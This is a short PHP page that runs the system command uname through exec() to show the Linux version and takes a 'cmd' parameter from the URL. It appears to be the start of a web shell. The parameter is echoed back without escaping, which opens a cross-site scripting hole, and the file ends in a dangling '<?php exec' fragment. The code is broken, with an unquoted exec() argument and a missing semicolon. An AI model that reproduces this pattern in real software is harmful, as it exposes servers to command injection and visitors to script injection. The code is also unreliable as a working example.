<html>
    <?php
        $linux_version=exec(uname -a);
        $cmd=$_GET["cmd"];
        echo "<h1> Linux version: $linux_version </h1>";
        echo "cmd=$cmd";
        echo ""
    ?>
</html>


<?php exec